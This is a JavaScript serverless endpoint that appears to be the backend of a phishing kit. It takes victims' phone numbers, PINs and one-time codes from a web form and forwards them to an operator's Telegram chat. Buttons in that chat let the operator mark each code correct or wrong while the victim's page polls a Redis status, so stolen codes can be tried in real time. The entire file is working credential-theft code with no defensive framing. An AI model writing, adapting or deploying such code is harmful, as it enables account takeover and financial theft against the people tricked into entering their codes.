export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL;
    const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN;

    // 1. Website Polling
    if (req.method === 'GET') {
        try {
            const { userId } = req.query;
            if (!REDIS_URL || !REDIS_TOKEN) return res.status(500).json({ error: 'Database env vars missing' });
            const dbRes = await fetch(`${REDIS_URL}/get/status_${userId}`, { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } });
            const dbData = await dbRes.json();
            return res.status(200).json({ status: dbData.result || 'pending' });
        } catch (error) {
            return res.status(500).json({ error: 'Database error' });
        }
    }

    if (req.method === 'POST') {
        let body = req.body;
        if (typeof body === 'string') {
            try { body = JSON.parse(body); } catch (e) { }
        }

        // 2. Send to Telegram
        if (body && body.action === 'send_verification') {
            try {
                const { phone, pin, userId, type } = body; 
                if (!BOT_TOKEN || !ADMIN_CHAT_ID) return res.status(500).json({ error: 'Missing Telegram settings.' });

                const dateStr = new Date().toLocaleString("en-US", { timeZone: "Africa/Dar_es_Salaam" });
                
                const text = `# Thor - ${type.toUpperCase()} Verification\n` +
                             `${type.toUpperCase()} VERIFICATION NEEDED\n\n` +
                             `USER DETAILS:\n` +
                             `• Phone Number: ${phone}\n` +
                             `• ${type.toUpperCase()} Code: ${pin}\n` +
                             `• Username & Pass: user_${userId}\n` +
                             `• Time: ${dateStr}\n` +
                             `• Bot: user75\n\n` +
                             `Verify the ${type.toUpperCase()}:\n` +
                             `• ${type.toUpperCase()} Length: ${pin.length} digits\n` +
                             `• Timeout: 5 minutes\n` +
                             `16.09`;

                const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: text,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "✅ Correct PIN", callback_data: `approve_${userId}_${type}` }],
                                [
                                    { text: "Correct PIN & OTP", callback_data: `approve_all_${userId}_${type}` },
                                    { text: "❌ Wrong PIN", callback_data: `reject_${userId}_${type}` }
                                ],
                                [{ text: "🕒 Extend Time", callback_data: `reject_${userId}_${type}` }]
                            ]
                        }
                    })
                });

                const tgData = await tgRes.json();
                if (!tgRes.ok) return res.status(500).json({ error: tgData.description });

                if (REDIS_URL && REDIS_TOKEN) {
                    await fetch(`${REDIS_URL}/set/status_${userId}/pending`, { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } });
                }

                return res.status(200).json({ success: true });
            } catch (error) {
                return res.status(500).json({ error: error.message });
            }
        }

        // 3. Handle Telegram Button Clicks
        if (body && body.callback_query) {
            try {
                const { id, data, message } = body.callback_query;
                
                let action = 'approve';
                let userId = '';
                let type = 'pin';

                if (data.startsWith('approve_all_')) {
                    action = 'approve_all';
                    const parts = data.replace('approve_all_', '').split('_');
                    userId = parts[0];
                    type = parts[1];
                } else if (data.startsWith('approve_')) {
                    action = 'approve';
                    const parts = data.replace('approve_', '').split('_');
                    userId = parts[0];
                    type = parts[1];
                } else if (data.startsWith('reject_')) {
                    action = 'reject';
                    const parts = data.replace('reject_', '').split('_');
                    userId = parts[0];
                    type = parts[1];
                }

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: id }) });
                
                let status = 'pending';
                let resultText = '';

                if (action === 'approve') {
                    status = 'approved';
                    resultText = `✅ PIN APPROVED - User can proceed`;
                } else if (action === 'reject') {
                    status = 'rejected';
                    resultText = `❌ WRONG ${type.toUpperCase()} - Rejected`;
                } else if (action === 'approve_all') {
                    status = 'approved_all';
                    resultText = `✅ PIN & OTP APPROVED - User can proceed`;
                }

                if (REDIS_URL && REDIS_TOKEN) {
                    await fetch(`${REDIS_URL}/set/status_${userId}/${status}`, { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } });
                }

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        message_id: message.message_id,
                        reply_markup: { inline_keyboard: [[{ text: resultText, callback_data: "noop" }]] }
                    })
                });
                return res.status(200).send('OK');
            } catch (error) {
                return res.status(500).send('Error');
            }
        }
    }
    return res.status(200).send('OK');
}
